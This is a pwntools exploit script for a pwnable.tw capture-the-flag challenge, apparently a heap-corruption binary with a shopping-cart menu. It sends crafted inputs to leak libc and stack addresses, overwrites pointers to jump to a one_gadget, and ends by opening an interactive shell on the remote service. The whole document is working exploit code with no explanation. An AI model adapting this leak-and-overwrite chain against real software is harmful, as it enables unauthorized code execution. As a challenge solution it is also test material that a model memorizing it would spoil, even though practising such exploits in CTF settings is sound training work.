from pwn import *
#io = remote('127.0.0.1',4000)
io = remote('chall.pwnable.tw',10104)

def add(ind):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('> ')
    io.sendline(str(ind))

def delete(ind):
    io.recvuntil('> ')
    io.sendline('3')
    io.recvuntil('> ')
    io.sendline(str(ind))

for i in range(6):
    add(1)
for i in range(20):
    add(2)

io.recvuntil('> ')
io.sendline('5' + '\xb0\x04\x08' + '\x00'*12)
io.recvuntil('> ')
io.sendline('y\x00')

io.recvuntil('> ')
io.sendline('4' + '\xb0\x04\x08' + '\x00'*12)
io.recvuntil('> ')
io.sendline('y\x00')
io.recvuntil('28: ')
start_main = u32(io.recvuntil(' - ')[:4])
libc_base = start_main - 0x18540 #0x18540
print(hex(libc_base))

for i in range(26):
    delete(1)

environ = libc_base + 0x1b1dbc #0x1b3dbc
io.recvuntil('> ')
io.sendline('4'+ '\xb0\x04\x08\x00\x00\x00\x00' + p32(environ-4) + p32(0))
io.recvuntil('> ')
io.sendline('y\x00')
io.recvuntil('3: ')
io.recvuntil('$')
environ_stack = int(io.recvline()[:-1],10) + 0x100000000
print(hex(environ_stack))

#raw_input()
one_gadget = libc_base + 0x5f066
io.recvuntil('> ')
io.sendline('3' + '\xb0\x04\x08' + p32(one_gadget) + p32(environ_stack - 0xe6) + p32(environ_stack - 0xcc))
io.recvuntil('> ')
io.sendline('2')
print(hex(environ_stack - 0xe6) + ' , ' + hex(environ_stack - 0xcc))

raw_input()
io.recvuntil('> ')
io.sendline('6' + '\x00\x00\x00' + p32(one_gadget) + p32(0) + p32(0))
#raw_input()

io.interactive()
